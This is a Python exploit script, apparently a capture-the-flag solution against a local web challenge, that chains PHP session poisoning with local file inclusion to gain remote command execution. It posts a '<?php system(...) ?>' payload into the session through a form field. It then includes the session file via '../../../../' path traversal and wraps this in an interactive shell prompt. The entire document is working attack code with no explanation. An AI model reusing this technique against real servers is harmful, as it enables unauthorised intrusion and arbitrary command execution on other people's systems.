def execute_command(command):
    # Step 1
    php_payload = '<?php system(\"' + command + '\"); ?>'

    # Step 2
    session_cookie = requests.get(target_url + target_endpoint).headers['Set-Cookie'].split(';')[0].split('=')[1]
    
    # Step 3
    post_data = 'name=' + php_payload
    post_headers = {'Cookie': 'PHPSESSID=' +session_cookie, 'Content-Type': 'application/x-www-form-urlencoded'}
    post_request = requests.post(target_url + target_endpoint, data = post_data, headers = post_headers)

    # Step 4
    lfi_payload = '../../../../'
    get_parameters = {'f': lfi_payload + '/tmp/sess_' + session_cookie}
    
    # Step 5
    get_request = requests.get(target_url, params = get_parameters)

    # Step 6
    lfi_output = get_request.text.split('"plane|')[1].split(':"')[1].split('";')[0].strip()

    return lfi_output

import requests

target_url = 'http://localhost:1337'
target_endpoint = '/send.php'

def main():
    print('[!] EXTORTION ZERO DAY LEET RCE:')
    while True:
        command = input('> ')
        print(execute_command(command))
